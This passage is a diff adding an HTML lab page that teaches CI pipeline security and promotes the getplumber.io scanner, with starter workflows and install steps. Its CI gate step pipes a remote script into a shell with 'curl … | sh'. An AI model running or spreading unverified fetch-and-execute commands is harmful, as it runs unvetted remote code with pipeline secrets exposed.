@@ -1,0 +1,1110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Plumber Lab &mdash; Pipeline Security, Visualized | RawWeights</title>
+  <meta name="description" content="An interactive lab that teaches CI/CD pipeline security through hands-on experience. No prior knowledge needed.">
+  <meta name="author" content="RawWeights">
+  <link rel="canonical" href="https://rawweights.com/usecase/plumber-lab.html">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://rawweights.com/usecase/plumber-lab.html">
+  <meta property="og:title" content="Plumber Lab — Pipeline Security, Visualized">
+  <meta property="og:description" content="No prior knowledge needed. See your CI pipeline the way an attacker does.">
+  <meta property="og:image" content="https://rawweights.com/images/plumber-lab.png">
+
+  <script>(function(){var t=localStorage.getItem('rw-theme')||(window.matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light');document.documentElement.setAttribute('data-theme',t);document.documentElement.classList.add('rw-no-transition');setTimeout(function(){document.documentElement.classList.remove('rw-no-transition');},50);})()</script>
+  <link rel="stylesheet" href="../includes/brand.css">
+  <script type="text/javascript" async src="../includes/analytics.js"></script>
+
+  <style>
+    /* Hero */
+    .guide-hero { background: linear-gradient(135deg,#07101f 0%,#0f0b28 50%,#071530 100%); padding:4rem 2rem 3.5rem; position:relative; overflow:hidden; }
+    .guide-hero::before { content:''; position:absolute; top:-20%; right:-5%; width:520px; height:520px; background:radial-gradient(circle,rgba(129,140,248,.18) 0%,transparent 65%); pointer-events:none; }
+    .guide-hero::after  { content:''; position:absolute; bottom:-10%; left:-5%; width:380px; height:380px; background:radial-gradient(circle,rgba(74,222,128,.08) 0%,transparent 65%); pointer-events:none; }
+    .hero-split { max-width:1160px; margin:0 auto; position:relative; display:grid; grid-template-columns:1fr 1fr; gap:3rem; align-items:center; }
+    .hero-split>* { min-width:0; }
+    .hero-text { display:flex; flex-direction:column; align-items:flex-start; }
+    .guide-hero-label { display:inline-flex; align-items:center; gap:.4rem; background:rgba(129,140,248,.12); border:1px solid rgba(129,140,248,.3); border-radius:9999px; padding:.3rem .9rem; font-size:.72rem; font-weight:700; color:#818cf8; text-transform:uppercase; letter-spacing:.08em; font-family:var(--rw-font-display); margin-bottom:1.25rem; }
+    .pulse-dot { width:6px; height:6px; background:#818cf8; border-radius:50%; animation:pulse 2s infinite; flex-shrink:0; }
+    @keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:.5;transform:scale(1.4)} }
+    .guide-hero h1 { font-family:var(--rw-font-display); font-size:clamp(1.8rem,3.5vw,3rem); font-weight:800; color:#f0f4ff; line-height:1.08; letter-spacing:-.03em; margin-bottom:1rem; }
+    .guide-hero h1 span { color:#818cf8; }
+    .guide-hero p { font-size:1rem; color:rgba(240,244,255,.7); margin:0 0 1.5rem; line-height:1.7; }
+    .hero-tags { display:flex; gap:.5rem; flex-wrap:wrap; margin-bottom:1.75rem; }
+    .hero-tag { font-size:.72rem; font-family:var(--rw-font-mono); color:rgba(240,244,255,.5); background:rgba(255,255,255,.07); border:1px solid rgba(255,255,255,.12); border-radius:6px; padding:.2rem .6rem; }
+    /* Terminal */
+    .hero-terminal-wrap { background:#0a0d1a; border-radius:14px; border:1px solid rgba(129,140,248,.25); box-shadow:0 0 60px rgba(129,140,248,.1),0 24px 48px rgba(0,0,0,.4); overflow:hidden; }
+    .terminal-topbar { background:#111827; padding:.6rem 1rem; display:flex; align-items:center; gap:.5rem; border-bottom:1px solid rgba(255,255,255,.07); }
+    .terminal-dot { width:10px; height:10px; border-radius:50%; }
+    .td-red{background:#ff5f57} .td-yellow{background:#febc2e} .td-green{background:#28c840}
+    .terminal-title { font-family:var(--rw-font-mono); font-size:.7rem; color:rgba(255,255,255,.35); margin-left:.5rem; }
+    #hero-terminal { font-family:var(--rw-font-mono); font-size:.78rem; line-height:1.65; padding:1.1rem 1.25rem; min-height:280px; max-height:360px; overflow:hidden; color:rgba(240,244,255,.6); }
+    .tl{white-space:pre} .tl.cmd{color:#818cf8} .tl.info{color:rgba(240,244,255,.4)} .tl.hi{color:#4ade80;font-weight:700} .tl.ok{color:#86efac} .tl.warn{color:#fbbf24} .tl.bad{color:#f87171} .tl.dim{color:rgba(240,244,255,.3)} .tl.gem{color:#818cf8;font-weight:700}
+    /* Layout */
+    .guide-layout { display:grid; grid-template-columns:220px 1fr; gap:2.5rem; max-width:1200px; margin:3rem auto; padding:0 1.5rem; align-items:start; }
+    .guide-layout>* { min-width:0; }
+    .guide-sidebar { position:sticky; top:calc(var(--rw-nav-height) + 1.5rem); }
+    .guide-toc-label { font-family:var(--rw-font-display); font-size:.7rem; font-weight:700; text-transform:uppercase; letter-spacing:.08em; color:var(--rw-text-subtle); margin-bottom:.75rem; }
+    .guide-toc { list-style:none; display:flex; flex-direction:column; gap:.15rem; }
+    .guide-toc a { font-size:.83rem; color:var(--rw-text-muted); text-decoration:none; padding:.3rem .6rem; border-left:2px solid transparent; display:block; border-radius:0 4px 4px 0; transition:color .15s,border-color .15s,background .15s; }
+    .guide-toc a:hover,.guide-toc a.active { color:#818cf8; border-left-color:#818cf8; background:rgba(129,140,248,.08); }
+    .guide-section { margin-bottom:3.5rem; }
+    .guide-section h2 { font-family:var(--rw-font-display); font-size:1.5rem; font-weight:800; color:var(--rw-text); margin-bottom:.35rem; padding-bottom:.6rem; border-bottom:2px solid rgba(129,140,248,.2); scroll-margin-top:calc(var(--rw-nav-height) + 1rem); }
+    .guide-section .section-sub { font-size:.85rem; color:var(--rw-text-subtle); margin-bottom:1.25rem; font-family:var(--rw-font-mono); }
+    .guide-section h3 { font-family:var(--rw-font-display); font-size:1.05rem; font-weight:700; color:var(--rw-text); margin:1.5rem 0 .5rem; scroll-margin-top:calc(var(--rw-nav-height) + 1rem); }
+    .guide-section p { font-size:.97rem; color:var(--rw-text-muted); line-height:1.75; margin-bottom:1rem; }
+    code { font-family:var(--rw-font-mono); font-size:.84em; background:var(--rw-bg-subtle); border:1px solid var(--rw-border); border-radius:4px; padding:.1em .35em; color:#818cf8; }
+    /* Stats */
+    .stat-row { display:flex; border:1px solid var(--rw-border); border-radius:var(--rw-r-md); overflow:hidden; margin:1.5rem 0; }
+    .stat-cell { flex:1; padding:1.1rem; text-align:center; border-right:1px solid var(--rw-border); }
+    .stat-cell:last-child { border-right:none; }
+    .stat-val { font-family:var(--rw-font-display); font-size:1.65rem; font-weight:800; color:#818cf8; line-height:1; }
+    .stat-val-g { color:#4ade80; }
+    .stat-label { font-size:.73rem; color:var(--rw-text-subtle); margin-top:.3rem; }
+    /* Badges */
+    .code-badge { display:inline-flex; align-items:center; gap:.35rem; font-family:var(--rw-font-mono); font-size:.72rem; padding:.2rem .6rem; border-radius:4px; font-weight:700; }
+    .badge-bad  { background:rgba(248,113,113,.15); color:#f87171; border:1px solid rgba(248,113,113,.3); }
+    .badge-ok   { background:rgba(74,222,128,.12); color:#4ade80; border:1px solid rgba(74,222,128,.25); }
+    .badge-warn { background:rgba(251,191,36,.12); color:#fbbf24; border:1px solid rgba(251,191,36,.25); }
+    .badge-ind  { background:rgba(129,140,248,.12); color:#818cf8; border:1px solid rgba(129,140,248,.25); }
+    /* Code blocks */
+    .code-block { background:#070d1a; border:1px solid rgba(255,255,255,.1); border-radius:10px; overflow:hidden; }
+    .code-block-header { background:#111827; padding:.5rem 1rem; font-family:var(--rw-font-mono); font-size:.7rem; color:rgba(255,255,255,.4); display:flex; align-items:center; justify-content:space-between; border-bottom:1px solid rgba(255,255,255,.07); }
+    .code-block-header .cb-title { color:rgba(255,255,255,.6); font-weight:600; }
+    .code-block pre { font-family:var(--rw-font-mono); font-size:.78rem; line-height:1.7; padding:1rem 1.25rem; margin:0; color:rgba(240,244,255,.65); overflow-x:auto; white-space:pre; }
+    .hl-bad { background:rgba(248,113,113,.12); color:#f87171; display:block; margin:0 -1.25rem; padding:0 1.25rem; border-left:3px solid #f87171; }
+    .hl-ok  { background:rgba(74,222,128,.08); color:#4ade80; display:block; margin:0 -1.25rem; padding:0 1.25rem; border-left:3px solid #4ade80; }
+    .hl-dim { color:rgba(240,244,255,.3); }
+    .hl-key { color:#818cf8; }
+    .hl-str { color:#fbbf24; }
+    .hl-cmt { color:rgba(240,244,255,.3); font-style:italic; }
+    /* Callout */
+    .ann { display:flex; gap:.75rem; align-items:flex-start; margin:.75rem 0; background:rgba(248,113,113,.07); border:1px solid rgba(248,113,113,.2); border-radius:8px; padding:.85rem 1rem; }
+    .ann-icon { font-size:1.1rem; flex-shrink:0; margin-top:.05rem; }
+    .ann-body { font-size:.83rem; color:var(--rw-text-muted); line-height:1.6; }
+    .ann-body strong { color:var(--rw-text); }
+    .ann.ok-ann { background:rgba(74,222,128,.06); border-color:rgba(74,222,128,.2); }
+    .ann.info-ann { background:rgba(129,140,248,.07); border-color:rgba(129,140,248,.2); }
+    /* Getting started */
+    .os-toggle { display:flex; gap:.5rem; margin-bottom:1.25rem; }
+    .os-btn { padding:.4rem 1rem; border-radius:8px; border:1.5px solid var(--rw-border); background:transparent; color:var(--rw-text-muted); font-family:var(--rw-font-display); font-size:.82rem; font-weight:600; cursor:pointer; transition:all .15s; }
+    .os-btn.active { background:rgba(129,140,248,.1); border-color:#818cf8; color:#818cf8; }
+    .start-step { background:var(--rw-card); border:1px solid var(--rw-border); border-radius:10px; overflow:hidden; margin-bottom:.85rem; }
+    .step-head { display:flex; align-items:center; gap:.85rem; padding:.85rem 1.1rem; }
+    .step-num-box { width:28px; height:28px; border-radius:8px; background:rgba(129,140,248,.15); color:#818cf8; font-family:var(--rw-font-display); font-weight:800; font-size:.85rem; display:flex; align-items:center; justify-content:center; flex-shrink:0; }
+    .step-title { font-family:var(--rw-font-display); font-weight:700; font-size:.93rem; color:var(--rw-text); }
+    .step-desc  { font-size:.82rem; color:var(--rw-text-subtle); }
+    .step-code-wrap { position:relative; background:#070d1a; border-top:1px solid rgba(255,255,255,.08); }
+    .step-code { font-family:var(--rw-font-mono); font-size:.82rem; color:#4ade80; padding:.9rem 3.5rem .9rem 1.1rem; overflow-x:auto; white-space:pre; }
+    .copy-btn { position:absolute; top:.6rem; right:.6rem; background:rgba(255,255,255,.06); border:1px solid rgba(255,255,255,.12); border-radius:6px; color:rgba(240,244,255,.5); font-family:var(--rw-font-mono); font-size:.68rem; padding:.25rem .6rem; cursor:pointer; transition:all .15s; }
+    .copy-btn:hover { background:rgba(255,255,255,.1); color:rgba(240,244,255,.8); }
+    /* Workflow starter */
+    .workflow-toggle { background:none; border:none; cursor:pointer; display:flex; align-items:center; gap:.5rem; color:#818cf8; font-family:var(--rw-font-display); font-size:.85rem; font-weight:700; padding:.5rem 0; margin-bottom:.5rem; }
+    .workflow-toggle .arrow { transition:transform .2s; display:inline-block; }
+    .workflow-toggle.open .arrow { transform:rotate(90deg); }
+    .workflow-starter { display:none; margin-bottom:1.25rem; }
+    .workflow-starter.open { display:block; }
+    /* Analogy cards */
+    .analogy-cards { display:grid; grid-template-columns:repeat(3,1fr); gap:1rem; margin:1.25rem 0; }
+    .analogy-card { background:var(--rw-card); border:1.5px solid var(--rw-border); border-radius:12px; padding:1.25rem; cursor:pointer; transition:all .2s; text-align:center; }
+    .analogy-card:hover { border-color:#818cf8; }
+    .analogy-card.active { border-color:#818cf8; background:rgba(129,140,248,.07); }
+    .analogy-card-emoji { font-size:2rem; margin-bottom:.5rem; }
+    .analogy-card-title { font-family:var(--rw-font-display); font-weight:800; font-size:.95rem; color:var(--rw-text); margin-bottom:.25rem; }
+    .analogy-card-hook  { font-size:.78rem; color:var(--rw-text-subtle); line-height:1.5; }
+    .analogy-detail { display:none; }
+    .analogy-detail.open { display:block; }
+    .analogy-split { display:grid; grid-template-columns:1fr 1fr; gap:1rem; margin-top:1rem; }
+    .analogy-half { border-radius:10px; padding:1.1rem 1.25rem; }
+    .analogy-half-label { font-family:var(--rw-font-display); font-size:.72rem; font-weight:700; text-transform:uppercase; letter-spacing:.07em; margin-bottom:.7rem; }
+    .analogy-world  { background:rgba(255,255,255,.04); border:1px solid var(--rw-border); }
+    .analogy-world  .analogy-half-label { color:var(--rw-text-subtle); }
+    .analogy-plumb  { background:rgba(129,140,248,.07); border:1px solid rgba(129,140,248,.25); }
+    .analogy-plumb  .analogy-half-label { color:#818cf8; }
+    .analogy-row { display:flex; align-items:flex-start; gap:.6rem; margin-bottom:.6rem; font-size:.85rem; color:var(--rw-text-muted); line-height:1.55; }
+    .analogy-row:last-child { margin-bottom:0; }
+    .analogy-dot { width:7px; height:7px; border-radius:50%; background:#818cf8; flex-shrink:0; margin-top:.45rem; }
+    .analogy-dot-g { background:#4ade80; }
+    /* Code compare */
+    .code-compare { display:grid; grid-template-columns:1fr 1fr; gap:1rem; margin:1rem 0; }
+    /* Playground */
+    .scenario-bar { display:flex; gap:.5rem; flex-wrap:wrap; margin-bottom:1.25rem; }
+    .sc-btn { padding:.45rem 1rem; border-radius:8px; border:1.5px solid var(--rw-border); background:var(--rw-card); color:var(--rw-text-muted); font-family:var(--rw-font-display); font-size:.82rem; font-weight:600; cursor:pointer; transition:all .15s; }
+    .sc-btn:hover { border-color:#f87171; color:#f87171; }
+    .sc-btn.active { border-color:#f87171; background:rgba(248,113,113,.1); color:#f87171; }
+    .playground-grid { display:grid; grid-template-columns:1fr 1fr; gap:1.25rem; align-items:start; }
+    .scan-panel { background:#070d1a; border:1px solid rgba(255,255,255,.1); border-radius:10px; overflow:hidden; }
+    .scan-output { font-family:var(--rw-font-mono); font-size:.77rem; line-height:1.7; padding:1rem 1.25rem; color:rgba(240,244,255,.55); min-height:200px; }
+    .score-row { display:flex; gap:1rem; align-items:center; margin-top:1rem; }
+    .score-badge { display:flex; align-items:center; justify-content:center; width:52px; height:52px; border-radius:10px; font-family:var(--rw-font-display); font-size:1.6rem; font-weight:900; }
+    .score-e { background:rgba(248,113,113,.15); color:#f87171; border:2px solid rgba(248,113,113,.4); }
+    .score-a { background:rgba(74,222,128,.12); color:#4ade80; border:2px solid rgba(74,222,128,.3); }
+    .fix-btn { padding:.5rem 1.1rem; border-radius:8px; border:1.5px solid rgba(74,222,128,.4); background:rgba(74,222,128,.08); color:#4ade80; font-family:var(--rw-font-display); font-size:.82rem; font-weight:700; cursor:pointer; transition:all .15s; }
+    .fix-btn:hover { background:rgba(74,222,128,.15); }
+    .fix-reveal { display:none; margin-top:1rem; }
+    .fix-reveal.open { display:block; }
+    /* Rego visualizer */
+    .rego-grid { display:grid; grid-template-columns:1fr 1fr; gap:1.25rem; margin-bottom:1rem; }
+    .rego-step-nav { display:flex; gap:.75rem; align-items:center; margin:1rem 0; }
+    .step-indicator { font-family:var(--rw-font-mono); font-size:.8rem; color:var(--rw-text-subtle); }
+    .step-btn { padding:.4rem 1rem; border-radius:8px; border:1.5px solid rgba(129,140,248,.4); background:rgba(129,140,248,.08); color:#818cf8; font-family:var(--rw-font-display); font-size:.82rem; font-weight:700; cursor:pointer; transition:all .15s; }
+    .step-btn:hover { background:rgba(129,140,248,.15); }
+    .step-btn:disabled { opacity:.35; cursor:default; }
+    .rego-explain { background:rgba(129,140,248,.07); border:1px solid rgba(129,140,248,.2); border-radius:8px; padding:1rem 1.25rem; font-size:.88rem; color:var(--rw-text-muted); line-height:1.7; margin-top:.5rem; }
+    .rego-explain strong { color:#818cf8; }
+    .rego-active-line { background:rgba(129,140,248,.18); color:#c4b5fd; display:block; margin:0 -1.25rem; padding:0 1.25rem; border-left:3px solid #818cf8; }
+    /* Architecture */
+    .arch-flow { display:flex; align-items:center; gap:0; flex-wrap:wrap; margin:1.5rem 0; }
+    .arch-box { flex:1; min-width:90px; background:var(--rw-card); border:1.5px solid var(--rw-border); border-radius:10px; padding:.9rem .75rem; text-align:center; cursor:pointer; transition:all .2s; }
+    .arch-box:hover,.arch-box.active { border-color:#818cf8; background:rgba(129,140,248,.07); }
+    .arch-box-icon { font-size:1.4rem; margin-bottom:.3rem; }
+    .arch-box-label { font-family:var(--rw-font-display); font-size:.78rem; font-weight:700; color:var(--rw-text); }
+    .arch-box-sub { font-size:.68rem; color:var(--rw-text-subtle); margin-top:.15rem; font-family:var(--rw-font-mono); }
+    .arch-arrow { color:var(--rw-text-subtle); font-size:1.2rem; padding:0 .35rem; flex-shrink:0; }
+    .arch-detail { display:none; background:rgba(129,140,248,.06); border:1px solid rgba(129,140,248,.2); border-radius:10px; padding:1.25rem; margin-top:.75rem; }
+    .arch-detail.open { display:grid; grid-template-columns:auto 1fr; gap:1rem; align-items:start; }
+    .arch-detail-icon { font-size:2rem; }
+    .arch-detail h4 { font-family:var(--rw-font-display); font-weight:700; font-size:1rem; color:var(--rw-text); margin-bottom:.4rem; }
+    .arch-detail p { font-size:.87rem; color:var(--rw-text-muted); line-height:1.65; margin:0 0 .5rem; }
+    /* Vendor */
+    .filter-bar { display:flex; gap:.5rem; flex-wrap:wrap; margin-bottom:1.25rem; }
+    .filter-chip { padding:.35rem .85rem; border-radius:9999px; border:1.5px solid var(--rw-border); background:transparent; color:var(--rw-text-muted); font-family:var(--rw-font-display); font-size:.8rem; font-weight:600; cursor:pointer; transition:all .15s; }
+    .filter-chip:hover { border-color:#818cf8; color:#818cf8; }
+    .filter-chip.active { background:#818cf8; border-color:#818cf8; color:#fff; }
+    .vendor-grid { display:grid; grid-template-columns:repeat(3,1fr); gap:1rem; }
+    .vendor-card { background:var(--rw-card); border:1.5px solid var(--rw-border); border-radius:10px; padding:1.1rem; transition:border-color .2s; }
+    .vendor-card.featured { border-color:rgba(129,140,248,.5); background:rgba(129,140,248,.04); }
+    .vendor-card.dim-card { opacity:.4; }
+    .vendor-name { font-family:var(--rw-font-display); font-size:.95rem; font-weight:800; color:var(--rw-text); margin-bottom:.15rem; }
+    .vendor-tagline { font-size:.78rem; color:var(--rw-text-subtle); margin-bottom:.85rem; }
+    .vendor-caps { display:flex; flex-direction:column; gap:.3rem; }
+    .vendor-cap { display:flex; align-items:center; gap:.5rem; font-size:.78rem; color:var(--rw-text-muted); }
+    .cap-yes{color:#4ade80} .cap-no{color:rgba(240,244,255,.2)} .cap-part{color:#fbbf24}
+    /* Feature grid */
+    .feature-grid { display:grid; grid-template-columns:repeat(3,1fr); gap:1rem; margin:1.5rem 0; }
+    .feature-card { background:var(--rw-card); border:1px solid var(--rw-border); border-radius:var(--rw-r-md); padding:1.25rem; }
+    .feature-card-icon { font-size:1.5rem; margin-bottom:.5rem; }
+    .feature-card h4 { font-family:var(--rw-font-display); font-size:.9rem; font-weight:700; color:var(--rw-text); margin-bottom:.35rem; }
+    .feature-card p { font-size:.82rem; color:var(--rw-text-muted); margin:0; }
+    /* Responsive */
+    @media(max-width:900px){
+      .guide-layout{grid-template-columns:1fr} .guide-sidebar{display:none}
+      .hero-split{grid-template-columns:1fr}
+      .code-compare,.rego-grid,.playground-grid,.vendor-grid,.analogy-split{grid-template-columns:1fr}
+      .arch-flow{flex-direction:column;align-items:stretch} .arch-arrow{transform:rotate(90deg);text-align:center}
+      .analogy-cards,.feature-grid{grid-template-columns:repeat(2,1fr)}
+    }
+  </style>
+</head>
+<body>
+
+<div id="rw-nav"></div>
+<script src="../includes/rw-nav.js?v=20260615"></script>
+
+<!-- ── Hero ──────────────────────────────────────────────────── -->
+<div class="guide-hero">
+  <div class="hero-split">
+    <div class="hero-text">
+      <span class="guide-hero-label"><span class="pulse-dot"></span> Interactive Lab &nbsp;&middot;&nbsp; No Prior Knowledge Needed</span>
+      <h1>See Your CI Pipeline<br><span>The Way an Attacker Does</span></h1>
+      <p>You write code. Your CI pipeline builds and deploys it. But who checks the pipeline itself? This lab walks you through every class of pipeline vulnerability &mdash; with analogies, live examples, and a step-by-step visualizer. Start from zero.</p>
+      <div class="hero-tags">
+        <span class="hero-tag">GitHub Actions</span>
+        <span class="hero-tag">GitLab CI</span>
+        <span class="hero-tag">OPA / Rego</span>
+        <span class="hero-tag">Supply Chain Security</span>
+        <span class="hero-tag">getplumber.io</span>
+      </div>
+      <div style="display:flex;gap:.75rem;flex-wrap:wrap;">
+        <a href="#start" class="rw-btn rw-btn-primary">Get Running &darr;</a>
+        <a href="https://getplumber.io" target="_blank" rel="noopener" class="rw-btn rw-btn-ghost">getplumber.io &rarr;</a>
+      </div>
+    </div>
+    <div class="hero-terminal-wrap">
+      <div class="terminal-topbar">
+        <span class="terminal-dot td-red"></span><span class="terminal-dot td-yellow"></span><span class="terminal-dot td-green"></span>
+        <span class="terminal-title">plumber scan .</span>
+      </div>
+      <div id="hero-terminal"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ── Guide Content ─────────────────────────────────────────── -->
+<div class="guide-layout">
+  <aside class="guide-sidebar">
+    <div class="guide-toc-label">Lab Sections</div>
+    <ul class="guide-toc" id="toc">
+      <li><a href="#start">Start Here</a></li>
+      <li><a href="#analogy">The Analogy</a></li>
+      <li><a href="#playground">Live Playground</a></li>
+      <li><a href="#rego">How Rules Work</a></li>
+      <li><a href="#architecture">Architecture</a></li>
+      <li><a href="#compare">vs. Others</a></li>
+    </ul>
+    <div style="margin-top:2rem;">
+      <div class="guide-toc-label">What it covers</div>
+      <div style="display:flex;flex-direction:column;gap:.4rem;margin-top:.5rem;">
+        <div style="font-size:.75rem;color:var(--rw-text-muted);">&#128274; Container &amp; image security</div>
+        <div style="font-size:.75rem;color:var(--rw-text-muted);">&#128190; Secrets &amp; credentials</div>
+        <div style="font-size:.75rem;color:var(--rw-text-muted);">&#9889; Trigger &amp; permissions</div>
+        <div style="font-size:.75rem;color:var(--rw-text-muted);">&#128203; Pipeline structure</div>
+        <div style="font-size:.75rem;color:var(--rw-text-muted);">&#127959; Branch protection</div>
+        <div style="font-size:.75rem;color:var(--rw-text-muted);">&#128101; Supply chain</div>
+        <div style="font-size:.75rem;color:var(--rw-text-muted);">&#128640; Ecosystem hygiene</div>
+      </div>
+    </div>
+  </aside>
+
+  <main>
+
+    <!-- ══ 1. START HERE ══════════════════════════════ -->
+    <section class="guide-section" id="start">
+      <h2>Start Here</h2>
+      <div class="section-sub">Install → Scan → Fix → Gate. No account needed.</div>
+
+      <p>Run plumber on any repo that has GitHub Actions or GitLab CI workflows. You get a letter score (A&ndash;E), a list of what&rsquo;s wrong, and exact instructions on how to fix each item.</p>
+
+      <div class="stat-row">
+        <div class="stat-cell"><div class="stat-val">A&ndash;E</div><div class="stat-label">score</div></div>
+        <div class="stat-cell"><div class="stat-val">9</div><div class="stat-label">risk categories</div></div>
+        <div class="stat-cell"><div class="stat-val stat-val-g">0</div><div class="stat-label">config to start</div></div>
+        <div class="stat-cell"><div class="stat-val">2</div><div class="stat-label">platforms: GH + GL</div></div>
+      </div>
+
+      <!-- Workflow starter callout -->
+      <button class="workflow-toggle" id="wf-toggle" onclick="toggleWorkflow()">
+        <span class="arrow">&#9658;</span> Don&rsquo;t have a workflow file yet? Start here.
+      </button>
+      <div class="workflow-starter" id="wf-starter">
+        <div class="ann info-ann" style="margin-bottom:.85rem;">
+          <span class="ann-icon">💡</span>
+          <div class="ann-body"><strong>What is a workflow file?</strong> A workflow file is a YAML file inside <code>.github/workflows/</code> in your repo. It tells GitHub when to run automated tasks — tests, builds, deployments. If you have no workflows yet, copy one of these to get started, then run plumber on it.</div>
+        </div>
+        <div style="margin-bottom:.75rem;font-family:var(--rw-font-display);font-size:.82rem;font-weight:700;color:var(--rw-text);">Minimal starter — CI with tests</div>
+        <div class="code-block" style="margin-bottom:1rem;">
+          <div class="code-block-header"><span class="cb-title">.github/workflows/ci.yml</span> <span class="badge-ok">A-score ready</span></div>
+          <pre><span class="hl-cmt"># Copy this into .github/workflows/ci.yml</span>
+<span class="hl-key">name</span>: CI
+
+<span class="hl-key">on</span>:
+  push:
+    branches: [main]
+  pull_request:
+    branches: [main]
+
+<span class="hl-key">permissions</span>:
+  contents: read        <span class="hl-cmt"># least privilege — required by plumber</span>
+
+<span class="hl-key">jobs</span>:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - <span class="hl-key">uses</span>: <span class="hl-str">actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683</span> <span class="hl-cmt"># v4</span>
+        <span class="hl-key">with</span>:
+          persist-credentials: false  <span class="hl-cmt"># don't write token to .git/config</span>
+      - <span class="hl-key">run</span>: npm ci
+      - <span class="hl-key">run</span>: npm test</pre>
+        </div>
+        <div style="margin-bottom:.75rem;font-family:var(--rw-font-display);font-size:.82rem;font-weight:700;color:var(--rw-text);">Weekly dependency audit</div>
+        <div class="code-block">
+          <div class="code-block-header"><span class="cb-title">.github/workflows/audit.yml</span> <span class="badge-ok">A-score ready</span></div>
+          <pre><span class="hl-cmt"># Runs every Monday — checks for vulnerable packages</span>
+<span class="hl-key">name</span>: Security Audit
+
+<span class="hl-key">on</span>:
+  schedule:
+    - cron: <span class="hl-str">'0 9 * * 1'</span>  <span class="hl-cmt"># every Monday 9am UTC</span>
+
+<span class="hl-key">permissions</span>:
+  contents: read
+
+<span class="hl-key">jobs</span>:
+  audit:
+    runs-on: ubuntu-latest
+    steps:
+      - <span class="hl-key">uses</span>: <span class="hl-str">actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683</span> <span class="hl-cmt"># v4</span>
+        <span class="hl-key">with</span>:
+          persist-credentials: false
+      - <span class="hl-key">run</span>: npm audit --audit-level=high</pre>
+        </div>
+      </div>
+
+      <!-- OS toggle -->
+      <div class="os-toggle">
+        <button class="os-btn active" onclick="showOS('mac',this)">macOS / Linux</button>
+        <button class="os-btn" onclick="showOS('win',this)">Windows</button>
+      </div>
+
+      <div id="os-mac">
+        <div class="start-step">
+          <div class="step-head">
+            <div class="step-num-box">1</div>
+            <div><div class="step-title">Install</div><div class="step-desc">One command. No account, no token, no config file needed.</div></div>
+          </div>
+          <div class="step-code-wrap">
+            <div class="step-code" id="m1">brew install getplumber/plumber/plumber</div>
+            <button class="copy-btn" onclick="copyCode('m1',this)">copy</button>
+          </div>
+        </div>
+        <div class="start-step">
+          <div class="step-head">
+            <div class="step-num-box">2</div>
+            <div><div class="step-title">Scan your repo</div><div class="step-desc">Run from your repo root. Plumber finds all workflow files automatically.</div></div>
+          </div>
+          <div class="step-code-wrap">
+            <div class="step-code" id="m2">plumber scan .</div>
+            <button class="copy-btn" onclick="copyCode('m2',this)">copy</button>
+          </div>
+        </div>
+        <div class="start-step">
+          <div class="step-head">
+            <div class="step-num-box">3</div>
+            <div><div class="step-title">Add the security gate to CI</div><div class="step-desc">Add this step to your workflow. It blocks the pipeline if the score drops below B &mdash; like a bouncer that won&rsquo;t let bad changes through.</div></div>
+          </div>
+          <div class="step-code-wrap">
+            <div class="step-code" id="m3">- name: Plumber security gate
+  run: |
+    curl -sSfL https://get.getplumber.io | sh
+    ./plumber scan --min-score B .</div>
+            <button class="copy-btn" onclick="copyCode('m3',this)">copy</button>
+          </div>
+        </div>
+      </div>
+
+      <div id="os-win" style="display:none;">
+        <div class="start-step">
+          <div class="step-head">
+            <div class="step-num-box">1</div>
+            <div><div class="step-title">Install via Scoop</div><div class="step-desc">Or download the binary directly from getplumber.io/docs/cli/installation.</div></div>
+          </div>
+          <div class="step-code-wrap">
+            <div class="step-code" id="w1">scoop bucket add plumber https://github.com/getplumber/scoop-plumber
+scoop install plumber</div>
+            <button class="copy-btn" onclick="copyCode('w1',this)">copy</button>
+          </div>
+        </div>
+        <div class="start-step">
+          <div class="step-head">
+            <div class="step-num-box">2</div>
+            <div><div class="step-title">Scan your repo</div><div class="step-desc">Run from your repo root in PowerShell.</div></div>
+          </div>
+          <div class="step-code-wrap">
+            <div class="step-code" id="w2">plumber scan .</div>
+            <button class="copy-btn" onclick="copyCode('w2',this)">copy</button>
+          </div>
+        </div>
+        <div class="start-step">
+          <div class="step-head">
+            <div class="step-num-box">3</div>
+            <div><div class="step-title">Add the security gate to CI</div><div class="step-desc">Same step as Linux — paste into your GitHub Actions workflow YAML.</div></div>
+          </div>
+          <div class="step-code-wrap">
+            <div class="step-code" id="w3">- name: Plumber security gate
+  run: |
+    curl -sSfL https://get.getplumber.io | sh
+    ./plumber scan --min-score B .</div>
+            <button class="copy-btn" onclick="copyCode('w3',this)">copy</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="ann ok-ann" style="margin-top:1.25rem;">
+        <span class="ann-icon">✅</span>
+        <div class="ann-body"><strong>Real result:</strong> A Next.js project with no CI workflows started at Score E, 30/100 after adding two basic workflow files. Two fixes &mdash; <code>persist-credentials: false</code> and branch protection &mdash; brought it to <span style="color:#4ade80;font-weight:700;">Score A, 100/100</span> in under 10 minutes.</div>
+      </div>
+    </section>
+
+    <!-- ══ 2. THE ANALOGY ═════════════════════════════ -->
+    <section class="guide-section" id="analogy">
+      <h2>The Analogy</h2>
+      <div class="section-sub">Pick the one that clicks. They all describe the same tool.</div>
+
+      <p>Pipeline security sounds intimidating. It&rsquo;s not. Pick the analogy below that makes most sense to you &mdash; each one maps directly to how plumber works.</p>
+
+      <div class="analogy-cards">
+        <div class="analogy-card active" id="ac-bouncer" onclick="showAnalogy('bouncer',this)">
+          <div class="analogy-card-emoji">🚪</div>
+          <div class="analogy-card-title">The Bouncer</div>
+          <div class="analogy-card-hook">Has a rulebook. Nothing gets in that breaks the rules.</div>
+        </div>
+        <div class="analogy-card" id="ac-playbook" onclick="showAnalogy('playbook',this)">
+          <div class="analogy-card-emoji">📋</div>
+          <div class="analogy-card-title">The Playbook</div>
+          <div class="analogy-card-hook">Everyone on the team follows the same rules, automatically.</div>
+        </div>
+        <div class="analogy-card" id="ac-spellcheck" onclick="showAnalogy('spellcheck',this)">
+          <div class="analogy-card-emoji">✍️</div>
+          <div class="analogy-card-title">Spell Check</div>
+          <div class="analogy-card-hook">Catches mistakes as they happen, not after the damage is done.</div>
